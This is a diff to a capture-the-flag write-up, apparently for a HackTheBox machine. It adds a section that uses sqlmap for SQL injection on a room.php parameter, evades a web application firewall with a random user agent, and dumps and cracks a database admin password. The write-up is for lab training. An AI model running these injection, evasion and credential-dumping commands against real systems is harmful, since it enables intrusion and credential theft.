@@ -64,7 +64,7 @@ gobuster dir -e -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.143/ -k 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2b9cd031-9d75-46b3-b745-7205f63e1071)
 
 
-## Exploitation
+## Exploitation: Method 1
 + Each room is directly referenced using the parameter **cod**, which could be a possible injection point, and check SQL Injection vulnerability.
 + Add single quotation `'` at the end of **cod** parameter. It doesn't crash the page or return 500, but the picture of the room disappear anymore.
 + No errors appeared since SQL errors may be suppressed.
@@ -213,6 +213,42 @@ DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 
 
 
+## Exploitation: Method 2
++ Run: `sqlmap -u "http://10.10.10.143/room.php?cod=5" --batch --dbs`
++ At this point, SQLmap fails. If we go to the website, we receive the message **"Hey you have been banned for 90 seconds, don't be bad"**.
++ Not only that, but the site now returns the previous same message on port 64999 about being blocked for 90 seconds.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c3f4f2f8-5070-4e7d-bd9f-b04c6ce347c0)
+
++ Look at the response headers, and notice one about **IronWAF 2.0.3**.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c50e32ec-df08-4e57-81d7-e0f56a911fda)
+
++ Try some WAF evasion techniques with **--random-agent**.
+```
+sqlmap -u "http://10.10.10.143/room.php?cod=5" --batch --dbs --random-agent
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/89f235c0-9e6e-4fb8-8eb9-6b05ae0db993)
+
++ Dump the sql username and password:
+```
+sqlmap -u "http://10.10.10.143/room.php?cod=5" --batch --dbs --random-agent --users --passwords
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d4745b1b-3fad-496c-b07b-29d928739fd0)
+
++ Cracked password:
+```
+[13:12:31] [INFO] cracked password 'imissyou' for user 'DBadmin'                                                     
+database management system users password hashes:                                                                    
+[*] DBadmin [1]:
+    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+    clear-text password: imissyou
+```
+
+
+
 ## Gaining Access: Method 1
 + Get into the phpmyadmin site with the discovered credentials: `http://10.10.10.143/phpmyadmin/`
 
@@ -248,6 +284,12 @@ DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 
 ## Gaining Access: Method 2
 + 
+
+
+
+## Gaining Access: Method 3 - sqlmap
+
+
 
 
 
